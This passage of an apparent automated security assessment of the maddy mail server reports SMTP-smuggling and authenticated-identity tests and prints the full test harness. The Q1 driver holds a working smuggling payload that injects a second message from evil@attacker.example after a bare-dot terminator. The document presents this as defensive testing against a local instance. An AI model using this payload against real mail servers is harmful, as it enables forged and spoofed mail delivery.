| Reject / tie back to A / blur accountability? | Ties every live decision to **A**; accepts B at command layer; blurs only on disk | §5.3, §5.6 |
| Which identity for **headers**? | `Received` records envelope **B** | §5.4, §5.6 (artifact 5) |
| Which identity for **queue metadata**? | `.meta` records envelope **B**; `AuthUser` never serialized (`Conn:null`) | §5.4, §5.6 (artifact 6) |
| Which identity for **enforcement checks**? | DKIM compares **A**; `{auth_user}`=**A**; SASL relay=**A**; domain gate on envelope domain | §5.3, §5.5, §5.6 (artifacts 3,2,4,7) |
| Does `RSET` re-scope identity? | No — `AuthUser` set once [smtp.go:L680], not cleared by `Reset`/`abort` [smtp.go:L60-L81] | §5.1 |
| Same-identity control | DKIM **signs** | §5.5 (Control 1) |
| Anonymous-on-25 control | No `username`; no principal | §5.5 (Control 2) |
| Envelope-vs-auth distinction | Two independent `require_sender_match` sub-checks | §5.5 (Control 3), §5.6 |
| Separate domain-routing gate | `501 5.1.8` only on non-local envelope domain | §5.5 (Control 4) |

### 6.2 Stability distribution (each scenario run >= 2x)

Behaviour was **identical** across both runs of every scenario; the only variation is the random `msg_id` (and ephemeral `src_ip`/timestamps). The `msg_id`s below are shown precisely to demonstrate the runs were genuinely distinct executions, not a cached result.

**Q1 (variant x port):**

| Variant | Port | Run 1 msg_id(s) | Run 2 msg_id(s) | Behaviour identical? |
|---------|------|-----------------|-----------------|----------------------|
| canonical | 25 | `42942189` | `07e9090d` | yes |
| canonical | 587 | `760af6da` | `c82233ae` | yes |
| bare_lf | 25 | `6ded1d4a` | `ae404ee0` | yes |
| bare_lf | 587 | `a5a9cd30` | `ee1200ef` | yes |
| bare_cr | 25 | `3f095e8a` | `ae1875d9` | yes |
| bare_cr | 587 | `5221980b` | `0d98ee63` | yes |
| middot | 25 | `4bd8a0e1` | `4958caf6` | yes |
| middot | 587 | `9357decf` | `35b5096f` | yes |
| dotstuffed | 25 | `87b2e238` | `56cf9bee` | yes |
| dotstuffed | 587 | `3cab66e1` | `8d572f7c` | yes |
| smuggle | 25 | `7da210f8,bbd18ee7` | `7fe01c2c,e195abed` | yes |
| smuggle | 587 | `fab2d8c5,6c8c5759` | `ba71516f,36e559fe` | yes |

Note: for `bare_cr` the structured log records the failing `msg_id` (via the `DATA error`/`554` path) even though nothing is stored; both runs produced the no-storage outcome. For `smuggle` two `msg_id`s appear on `:25` (benign + injected) and two on `:587` (benign + domain-rejected injection).

**Q2 (scenario):**

| Scenario | Run 1 msg_id(s) | Run 2 msg_id(s) | Behaviour identical? |
|----------|-----------------|-----------------|----------------------|
| mismatch | `3cbce707` | `b8b81ea9` | yes |
| same_identity | `43484236` | `3ac9d508` | yes |
| anon25 | `7ce1e6a1` | `a16b2f23` | yes |
| envelope_mismatch | `3f478420` | `be47c0a7` | yes |
| domain_reject | `6431df3b` | `bf06dd7a` | yes |


## 7. Fails-safe judgement

maddy's own design yardstick is "Be secure but interoperable." [HACKING.md:L19]. Measured against that and against RFC 5321 §4.5.2 (the end-of-data marker is a line containing only a period; servers must strip one leading dot on dot-stuffed lines), the honest verdict is **split by axis** — it is not a single yes/no.

**(a) Message-boundary framing — mostly fail-safe, but NOT strict/fail-closed on a bare `LF`.**
- *Canonical `<CR><LF>.<CR><LF>`*: correct and RFC-compliant — stops exactly at the marker, un-stuffs dots, normalises CRLF (§4.2, §4.4). **Fail-safe.**
- *Bare `CR` (`\r.\r`)*: the reader never reaches its end state, the transaction dies with `554` and **nothing is stored** (§4.3). Refusing to guess a boundary and storing nothing is the safest possible outcome. **Fail-closed.**
- *Bare `LF` (`\n.\n`)*: **accepted as a terminator** (§4.3). This is the one place maddy is *lenient rather than strict*. It is exactly the leniency behind the 2023-2024 SMTP-smuggling class (US-CERT VU#302671; the Sendmail/Exim/Postfix hardening that added strict-CRLF / bare-newline rejection): if a downstream hop disagrees on whether `\n.\n` ends the message, the two hops can be desynchronised and content can be smuggled. maddy does **not** reject bare-`LF` terminators. The behaviour originates in Go's `net/textproto` dot reader [net/textproto/reader.go:L350-L352], not in maddy code, but the *observable posture of the running server* is lenient. **Not fail-closed.** Crucially, §4.5 shows the direct consequence: post-terminator bytes are executed as commands, and on an unrestricted intake (`:25`) a second attacker-controlled message is injected and queued.

**(b) Live authentication enforcement — fail-safe.** The authenticated identity is pinned to the whole connection and cannot be silently swapped by `RSET`+new `MAIL FROM` (§5.1). Every in-memory consumer sees the true login A (§5.6, artifacts 1-4). Most importantly, a cross-identity `From` does **not** cause maddy to sign B's mail with A's key — the DKIM signer **withholds** the signature and logs the exact reason (§5.3, §5.5). maddy therefore never *mis-attributes* a cryptographic identity, and it never enters an undefined state on the identity switch. The mismatch is not itself a rejection, but the default outcome (unsigned mail + envelope-domain policy gate) is conservative.

**(c) Persisted accountability — incomplete.** The authenticated principal A is deliberately stripped before the queue metadata is written (`Conn` nulled at [internal/target/queue/queue.go:L752]); the on-disk `.meta` and the `Received` header both record only the envelope B (§5.4). An operator doing post-hoc forensics **from disk alone** cannot determine which authenticated login sent a queued message. This is an accountability gap (not a spoofing vector by itself, since live enforcement already saw A), and it is the concrete sense in which the system "blurs accountability."

**Bottom line.** maddy fails safe on the two things that matter most for integrity — it never guesses an ambiguous boundary into an undefined state, and it never mis-signs or silently trusts a forged identity in the live path. It is **not** strict/fail-closed on bare-`LF` message framing (the smuggling-relevant gap), and its **on-disk accountability is incomplete** because the authenticated identity is not persisted. A deployment that wants to be fail-*closed* rather than merely fail-*safe* would need bare-newline rejection at the DATA layer and persistence of the authenticated principal in queue metadata.


## 8. Appendix — exact commands, full harness scripts, provisioning, and cleanup

Everything below lived under `/tmp/maddy-scratch` (non-repository) and `/tmp/maddy-bin`, and is removed in §8.5. Nothing here is added to the tracked tree.

### 8.1 Exact commands

**Build (canonical):**
```text
go build -tags 'nopam nosqlite3' -o /tmp/maddy-bin ./cmd/maddy    # exit 0, 18859700 bytes
```
**Provision synthetic credentials** (the `extauth` helper in §8.2 is self-contained; no external store is needed — it answers maddy's auth protocol directly).

**Run the server (as root, to bind :25 / :587):**
```text
/tmp/maddy-bin -config /tmp/maddy-scratch/maddy.conf -debug &   # PID captured to /tmp/maddy-scratch/maddy.pid
python3 /tmp/maddy-scratch/sink.py &                             # downstream sink on 127.0.0.1:2525
```
**Drive Q1 (each variant, each port, twice)** and **capture a cell:**
```text
for variant in canonical bare_lf bare_cr middot dotstuffed smuggle; do
  for port in 25 587; do
    for run in run1 run2; do
      python3 /tmp/maddy-scratch/q1_driver.py $port $variant   # emits the wire dialogue
      /tmp/maddy-scratch/run_q1_cell.sh $variant $port $run    # slices logs + dumps .body/.header/.meta
    done
  done
done
```
**Drive Q2 (each scenario, twice):**
```text
for scenario in mismatch same_identity anon25 envelope_mismatch domain_reject; do
  for run in run1 run2; do
    python3 /tmp/maddy-scratch/q2_driver.py $scenario
  done
done
```
### 8.2 Scratch config and auth/enforcement helpers

**`/tmp/maddy-scratch/maddy.conf`** (ephemeral; the shipped default binds `submission` on `tls://0.0.0.0:465` [maddy.conf:L93] — here `:587` with `tls off` to match the user's scenario and expose the byte dialogue):
```text
# ---- EPHEMERAL SCRATCH CONFIG (non-repository, under /tmp, deleted after observation) ----
state /tmp/maddy-scratch/state
runtime /tmp/maddy-scratch/runtime

$(hostname) = localhost
$(primary_domain) = localhost
$(local_domains) = localhost

hostname localhost
autogenerated_msg_domain localhost
tls off

extauth local_authdb {
    helper /tmp/maddy-scratch/auth-helper.sh
    domains localhost
}

queue test_queue {                       # :587 path — relays SASL creds, persists files
    location /tmp/maddy-scratch/queue
    max_tries 8
    target smtp_downstream tcp://127.0.0.1:2525 {
        hostname localhost
        attempt_starttls no
        auth forward
    }
}

queue test_queue25 {                     # :25 path — no auth forward, so unauth mail persists
    location /tmp/maddy-scratch/queue25
    max_tries 8
    target smtp_downstream tcp://127.0.0.1:2525 {
        hostname localhost
        attempt_starttls no
    }
}

smtp tcp://0.0.0.0:25 {
    io_debug yes
    deliver_to &test_queue25
}

submission tcp://0.0.0.0:587 {
    insecure_auth yes
    io_debug yes
    auth &local_authdb

    source $(local_domains) {
        check {
            command /tmp/maddy-scratch/echo_authuser.sh {auth_user} {
                run_on sender
            }
        }
        modify {
            sign_dkim $(primary_domain) default
        }
        deliver_to &test_queue
    }

    default_source {
        reject 501 5.1.8 "Non-local sender domain"
    }
}
```
**`/tmp/maddy-scratch/auth-helper.sh`** (SYNTHETIC THROWAWAY credentials — see §5.2):
```text
#!/bin/sh
# SYNTHETIC THROWAWAY TEST credential helper (extauth protocol).
# line 1 = account, line 2 = password; exit 0 = OK, non-zero = reject.
read -r acct
read -r pass
if [ "$acct" = "usera" ] && [ "$pass" = "password123" ]; then exit 0; fi
if [ "$acct" = "userb" ] && [ "$pass" = "password456" ]; then exit 0; fi
exit 1
```
**`/tmp/maddy-scratch/echo_authuser.sh`** (captures the `{auth_user}` placeholder value that maddy passes to an external check [internal/check/command/command.go:L149]):
```text
#!/bin/sh
# Records the {auth_user} value maddy expands and passes as argv[1].
echo "authuser=[$1]" >> /tmp/maddy-scratch/capture/authuser.log
exit 0
```
### 8.3 Downstream sink, raw SMTP client, and drivers

**`/tmp/maddy-scratch/sink.py`** (returns `451` to keep messages queued; logs the relayed SASL bytes and full DATA):
```python
#!/usr/bin/env python3
# Ephemeral downstream SMTP sink for observation (NON-REPOSITORY, /tmp).
# Advertises AUTH PLAIN, logs the decoded SASL bytes + envelope + full DATA,
# then returns 451 (temporary failure) so maddy's queue KEEPS the message on
# disk (.body/.header/.meta) for inspection.
import socket, socketserver, base64, datetime, threading

LOG = "/tmp/maddy-scratch/sink.log"
_lock = threading.Lock()

def log(line):
    with _lock:
        with open(LOG, "a") as f:
            f.write(line + "\n")

class Handler(socketserver.StreamRequestHandler):
    def send(self, s):
        self.wfile.write((s + "\r\n").encode())
        self.wfile.flush()
    def handle(self):
        cid = datetime.datetime.utcnow().isoformat()
        log(f"=== SINK CONN {cid} from {self.client_address} ===")
        self.send("220 sink.local ESMTP sink ready")
        while True:
            raw = self.rfile.readline()
            if not raw:
                log(f"[{cid}] (peer closed)")
                break
            line = raw.decode(errors="replace").rstrip("\r\n")
            up = line.upper()
            if up.startswith("EHLO") or up.startswith("HELO"):
                log(f"[{cid}] <- {line}")
                self.wfile.write(b"250-sink.local greets you\r\n")
                self.wfile.write(b"250-PIPELINING\r\n")
                self.wfile.write(b"250-SIZE 33554432\r\n")
                self.wfile.write(b"250-AUTH PLAIN LOGIN\r\n")
                self.wfile.write(b"250 8BITMIME\r\n")
                self.wfile.flush()
            elif up.startswith("AUTH PLAIN"):
                parts = line.split(" ", 2)
                if len(parts) == 3:
                    blob = parts[2]
                    try:
                        dec = base64.b64decode(blob)
                    except Exception:
                        dec = b"<decode-error>"
                    log(f"[{cid}] DOWNSTREAM-AUTH raw-b64={blob!r} decoded={dec!r}")
                    self.send("235 2.7.0 Authentication successful")
                else:
                    self.send("334 ")
                    resp = self.rfile.readline().decode().strip()
                    dec = base64.b64decode(resp) if resp else b""
                    log(f"[{cid}] DOWNSTREAM-AUTH decoded={dec!r}")
                    self.send("235 2.7.0 Authentication successful")
            elif up.startswith("MAIL FROM"):
                log(f"[{cid}] DOWNSTREAM-MAIL {line}")
                self.send("250 2.1.0 Sender OK")
            elif up.startswith("RCPT TO"):
                log(f"[{cid}] DOWNSTREAM-RCPT {line}")
                self.send("250 2.1.5 Recipient OK")
            elif up.startswith("DATA"):
                self.send("354 End data with <CR><LF>.<CR><LF>")
                msg = []
                while True:
                    dl = self.rfile.readline()
                    if not dl:
                        break
                    if dl in (b".\r\n", b".\n"):
                        break
                    # un-stuff leading dot for logging fidelity
                    if dl.startswith(b".."):
                        dl = dl[1:]
                    msg.append(dl)
                body = b"".join(msg)
                log(f"[{cid}] DOWNSTREAM-DATA ({len(body)} bytes):")
                for ml in body.decode(errors="replace").split("\n"):
                    log(f"[{cid}] DATA| {ml}")
                # temp-fail so the queue keeps the message on disk
                self.send("451 4.3.0 Sink temp-fail on purpose (keep queued)")
            elif up.startswith("RSET"):
                self.send("250 2.0.0 OK")
            elif up.startswith("NOOP"):
                self.send("250 2.0.0 OK")
            elif up.startswith("QUIT"):
                self.send("221 2.0.0 Bye")
                break
            else:
                log(f"[{cid}] <- (other) {line}")
                self.send("250 2.0.0 OK")

class TS(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

if __name__ == "__main__":
    with TS(("127.0.0.1", 2525), Handler) as srv:
        log("=== SINK START on 127.0.0.1:2525 ===")
        srv.serve_forever()
```
**`/tmp/maddy-scratch/smtplib_raw.py`** (raw byte-level SMTP client + SASL PLAIN encoder):
```python
# Minimal raw-SMTP client used by both drivers. Records byte-exact dialogue.
import socket, base64, time

class Raw:
    def __init__(self, host, port, timeout=5.0):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.log = []
    def recv(self, tmo=2.0):
        self.s.settimeout(tmo)
        data = b""
        try:
            while True:
                chunk = self.s.recv(4096)
                if not chunk:
                    break
                data += chunk
                # stop when we have at least one complete line and no more immediately
                if data.endswith(b"\r\n"):
                    self.s.settimeout(0.3)
                    try:
                        more = self.s.recv(4096)
                        if not more:
                            break
                        data += more
                    except socket.timeout:
                        break
        except socket.timeout:
            pass
        if data:
            self.log.append(("<<", data))
        return data
    def send_raw(self, b):
        self.log.append((">>", b))
        self.s.sendall(b)
    def line(self, s):
        self.send_raw(s.encode() + b"\r\n")
    def shutdown_wr(self):
        try:
            self.s.shutdown(socket.SHUT_WR)
        except OSError:
            pass
    def close(self):
        try:
            self.s.close()
        except OSError:
            pass

def auth_plain_b64(authcid, password, authzid=""):
    raw = authzid.encode() + b"\x00" + authcid.encode() + b"\x00" + password.encode()
    return raw, base64.b64encode(raw).decode()

def dump(cli):
    out = []
    for d, b in cli.log:
        out.append(f"{d} {b!r}")
    return "\n".join(out)
```
**`/tmp/maddy-scratch/q1_driver.py`** (the five Q1 terminator payloads + the smuggling payload):
```python
#!/usr/bin/env python3
# Q1 DATA/message-boundary driver. Usage: q1_driver.py <port> <variant>
# variant in: canonical bare_lf bare_cr middot dotstuffed smuggle
import sys, time
sys.path.insert(0, "/tmp/maddy-scratch")
from smtplib_raw import Raw, auth_plain_b64, dump

HOST = "127.0.0.1"
HDR = b"From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\n"

PAYLOADS = {
    # canonical CRLF bare-dot terminator
    "canonical":  HDR + b"line one\r\nline two\r\n.\r\n",
    # bare-LF terminator (no CR) — should terminate (lenient)
    "bare_lf":    HDR + b"line one\nline two\n.\n",
    # bare-CR terminator (no LF) — should NOT terminate
    "bare_cr":    HDR + b"line one\rline two\r.\r",
    # mid-body bare dot then more lines then real terminator
    "middot":     HDR + b"before dot line\r\n.\r\nAFTER DOT LINE ONE\r\nAFTER DOT LINE TWO\r\n.\r\n",
    # dot-stuffed content (leading dots)
    "dotstuffed": HDR + b"..one leading dot\r\n...two leading dots\r\nnormal line\r\n.\r\n",
    # smuggling: valid SMTP commands after the first bare dot
    "smuggle":    HDR + b"benign body line\r\n.\r\n"
                      + b"MAIL FROM:<evil@attacker.example>\r\n"
                      + b"RCPT TO:<victim@localhost>\r\n"
                      + b"DATA\r\nSubject: smuggled\r\n\r\nsmuggled body\r\n.\r\n",
}

def run(port, variant):
    payload = PAYLOADS[variant]
    c = Raw(HOST, int(port))
    print(f"##### Q1 variant={variant} port={port} #####")
    print("banner:", repr(c.recv()))
    c.line("EHLO client.test"); print("EHLO:", repr(c.recv()))
    if int(port) == 587:
        _, b64 = auth_plain_b64("usera@localhost", "password123")
        c.line("AUTH PLAIN " + b64); print("AUTH:", repr(c.recv()))
    c.line("MAIL FROM:<usera@localhost>"); print("MAIL:", repr(c.recv()))
    c.line("RCPT TO:<dest@localhost>"); print("RCPT:", repr(c.recv()))
    c.line("DATA"); print("DATA(354):", repr(c.recv()))
    print("BODY PAYLOAD:", repr(payload))
    c.send_raw(payload)
    if variant == "bare_cr":
        # server keeps reading DATA; signal EOF by closing the write half
        r = c.recv(tmo=1.5)
        print("POST-DATA (before close):", repr(r))
        c.shutdown_wr()
        print("POST-DATA (after SHUT_WR):", repr(c.recv(tmo=2.0)))
    else:
        print("POST-DATA:", repr(c.recv(tmo=3.0)))
        c.line("NOOP"); print("NOOP:", repr(c.recv()))
        c.line("QUIT"); print("QUIT:", repr(c.recv()))
    c.close()

if __name__ == "__main__":
    run(sys.argv[1], sys.argv[2])
```
**`/tmp/maddy-scratch/q2_driver.py`** (the mismatch scenario + four controls):
```python
#!/usr/bin/env python3
# Q2 auth-identity driver. Usage: q2_driver.py <scenario>
# scenarios: mismatch same_identity anon25 envelope_mismatch domain_reject
import sys
sys.path.insert(0, "/tmp/maddy-scratch")
from smtplib_raw import Raw, auth_plain_b64

HOST = "127.0.0.1"

def body(fromhdr):
    return (f"From: <{fromhdr}>\r\nTo: <dest@localhost>\r\nSubject: q2\r\n\r\nbody line\r\n.\r\n").encode()

def mismatch(port=587):
    # AUTH A -> MAIL A -> RSET -> MAIL B (no re-auth) -> RCPT -> DATA (header From: B)
    c = Raw(HOST, port); print("banner:", repr(c.recv()))
    c.line("EHLO client.test"); print("EHLO:", repr(c.recv()))
    raw, b64 = auth_plain_b64("usera@localhost", "password123")
    print("AUTH PLAIN raw bytes:", repr(raw), "b64:", b64)
    c.line("AUTH PLAIN " + b64); print("AUTH (usera):", repr(c.recv()))
    c.line("MAIL FROM:<usera@localhost>"); print("MAIL1 <usera>:", repr(c.recv()))
    c.line("RSET"); print("RSET:", repr(c.recv()))
    c.line("MAIL FROM:<userb@localhost>"); print("MAIL2 <userb> (no re-auth):", repr(c.recv()))
    c.line("RCPT TO:<dest@localhost>"); print("RCPT:", repr(c.recv()))
    c.line("DATA"); print("DATA:", repr(c.recv()))
    c.send_raw(body("userb@localhost")); print("POST-DATA:", repr(c.recv(tmo=3.0)))
    c.line("QUIT"); print("QUIT:", repr(c.recv()))
    c.close()

def same_identity(port=587):
    c = Raw(HOST, port); print("banner:", repr(c.recv()))
    c.line("EHLO client.test"); print("EHLO:", repr(c.recv()))
    _, b64 = auth_plain_b64("usera@localhost", "password123")
    c.line("AUTH PLAIN " + b64); print("AUTH (usera):", repr(c.recv()))
    c.line("MAIL FROM:<usera@localhost>"); print("MAIL1 <usera>:", repr(c.recv()))
    c.line("RSET"); print("RSET:", repr(c.recv()))
    c.line("MAIL FROM:<usera@localhost>"); print("MAIL2 <usera>:", repr(c.recv()))
    c.line("RCPT TO:<dest@localhost>"); print("RCPT:", repr(c.recv()))
    c.line("DATA"); print("DATA:", repr(c.recv()))
    c.send_raw(body("usera@localhost")); print("POST-DATA:", repr(c.recv(tmo=3.0)))
    c.line("QUIT"); print("QUIT:", repr(c.recv()))
    c.close()

def anon25(port=25):
    c = Raw(HOST, port); print("banner:", repr(c.recv()))
    c.line("EHLO client.test"); print("EHLO:", repr(c.recv()))
    c.line("MAIL FROM:<other@localhost>"); print("MAIL <other> (no auth):", repr(c.recv()))
    c.line("RCPT TO:<dest@localhost>"); print("RCPT:", repr(c.recv()))
    c.line("DATA"); print("DATA:", repr(c.recv()))
    c.send_raw(body("other@localhost")); print("POST-DATA:", repr(c.recv(tmo=3.0)))
    c.line("QUIT"); print("QUIT:", repr(c.recv()))
    c.close()

def envelope_mismatch(port=587):
    # authenticate A, envelope B (local), header From: A -> DKIM envelope-mismatch decline
    c = Raw(HOST, port); print("banner:", repr(c.recv()))
    c.line("EHLO client.test"); print("EHLO:", repr(c.recv()))
    _, b64 = auth_plain_b64("usera@localhost", "password123")
    c.line("AUTH PLAIN " + b64); print("AUTH (usera):", repr(c.recv()))
    c.line("MAIL FROM:<userb@localhost>"); print("MAIL <userb>:", repr(c.recv()))
    c.line("RCPT TO:<dest@localhost>"); print("RCPT:", repr(c.recv()))
    c.line("DATA"); print("DATA:", repr(c.recv()))
    c.send_raw(body("usera@localhost")); print("POST-DATA:", repr(c.recv(tmo=3.0)))
    c.line("QUIT"); print("QUIT:", repr(c.recv()))
    c.close()

def domain_reject(port=587):
    # authenticate A, envelope non-local domain -> default_source reject 501 at RCPT
    c = Raw(HOST, port); print("banner:", repr(c.recv()))
    c.line("EHLO client.test"); print("EHLO:", repr(c.recv()))
    _, b64 = auth_plain_b64("usera@localhost", "password123")
    c.line("AUTH PLAIN " + b64); print("AUTH (usera):", repr(c.recv()))
    c.line("MAIL FROM:<usera@localhost>"); print("MAIL1 <usera>:", repr(c.recv()))
    c.line("RSET"); print("RSET:", repr(c.recv()))
    c.line("MAIL FROM:<userb@external.example>"); print("MAIL2 <userb@external.example> (no re-auth):", repr(c.recv()))
    c.line("RCPT TO:<dest@localhost>"); print("RCPT:", repr(c.recv()))
    c.line("DATA"); print("DATA:", repr(c.recv()))
    c.line("QUIT"); print("QUIT:", repr(c.recv()))
    c.close()

SC = {"mismatch": mismatch, "same_identity": same_identity, "anon25": anon25,
      "envelope_mismatch": envelope_mismatch, "domain_reject": domain_reject}

if __name__ == "__main__":
    name = sys.argv[1]
    print(f"##### Q2 scenario={name} #####")
    SC[name]()
```
### 8.4 Cell-capture helper

**`/tmp/maddy-scratch/run_q1_cell.sh`** (slices the maddy/sink log windows, extracts `msg_id`s, and dumps `.body` via `od -c`, `.header`, and `.meta` — or records `NO STORED FILES` for the no-storage cases):
```text
#!/bin/bash
# Usage: run_q1_cell.sh <variant> <port> <run>
SCRATCH=/tmp/maddy-scratch
variant="$1"; port="$2"; run="$3"
outdir="$SCRATCH/evidence/q1"
tag="${variant}_${port}_run${run}"
before=$(wc -c < "$SCRATCH/maddy.log")
sinkbefore=$(wc -c < "$SCRATCH/sink.log")
# run driver
python3 "$SCRATCH/q1_driver.py" "$port" "$variant" > "$outdir/${tag}.dialogue" 2>&1
sleep 2
# new maddy.log window
tail -c +$((before+1)) "$SCRATCH/maddy.log" > "$outdir/${tag}.maddylog"
tail -c +$((sinkbefore+1)) "$SCRATCH/sink.log" > "$outdir/${tag}.sinklog"
# extract structured lines of interest
grep -E 'incoming message|accepted|DATA error|reset|will retry|501 5.5.2 Bad command|554 5.0.0|RCPT error' "$outdir/${tag}.maddylog" > "$outdir/${tag}.structured" 2>/dev/null
# msg_ids
msgids=$(grep -oE '"msg_id":"[a-f0-9]+"' "$outdir/${tag}.maddylog" | grep -oE '[a-f0-9]{8}' | sort -u)
qdir="$SCRATCH/queue"; [ "$port" = "25" ] && qdir="$SCRATCH/queue25"
echo "MSGIDS: $msgids" > "$outdir/${tag}.artifacts"
for m in $msgids; do
  if [ -f "$qdir/$m.body" ]; then
    echo "--- $m.body (od -c) ---" >> "$outdir/${tag}.artifacts"
    od -c "$qdir/$m.body" >> "$outdir/${tag}.artifacts"
    echo "--- $m.header ---" >> "$outdir/${tag}.artifacts"
    cat "$qdir/$m.header" >> "$outdir/${tag}.artifacts"
    echo "--- $m.meta ---" >> "$outdir/${tag}.artifacts"
    cat "$qdir/$m.meta" >> "$outdir/${tag}.artifacts"
    echo "" >> "$outdir/${tag}.artifacts"
  else
    echo "--- $m : NO STORED FILES in $qdir (no-storage) ---" >> "$outdir/${tag}.artifacts"
  fi
done
echo "[cell $tag done] msgids=$msgids"
```
### 8.5 Cleanup and final repository state

After capturing all evidence, the scratch instance and all scaffolding are removed and the repository is confirmed unchanged apart from this one document:
```text
# stop the two processes we started, by their captured PIDs only
kill "$(cat /tmp/maddy-scratch/maddy.pid)" "$(cat /tmp/maddy-scratch/sink.pid)"
# remove all non-repository scaffolding
rm -rf /tmp/maddy-scratch /tmp/maddy-bin /tmp/docgen
# confirm the tracked tree is byte-for-byte unchanged except the new answer document
git -C <repo> status --porcelain
#   ?? blitzy/documentation/maddy_26452dd8dd78.md   (the only change; go.mod/go.sum untouched)
```
The only repository artifact produced by this task is `blitzy/documentation/maddy_26452dd8dd78.md`. No existing source file, build file, dependency manifest, or the tracked `maddy.conf` was modified; the `blitzy/documentation/` directory was created to hold this file. (The sibling `blitzy/screen_recordings/` and `blitzy/screenshots/` directories are platform-generated and left as-is.) Only the `maddy` repository under review was analysed; the platform's own `/app` directory and tooling were never inspected or documented. The read-only scope holds byte-for-byte: `go.mod`/`go.sum` are untouched, no `internal/**` or `cmd/**` source changed, and the sole tracked addition is this answer document.

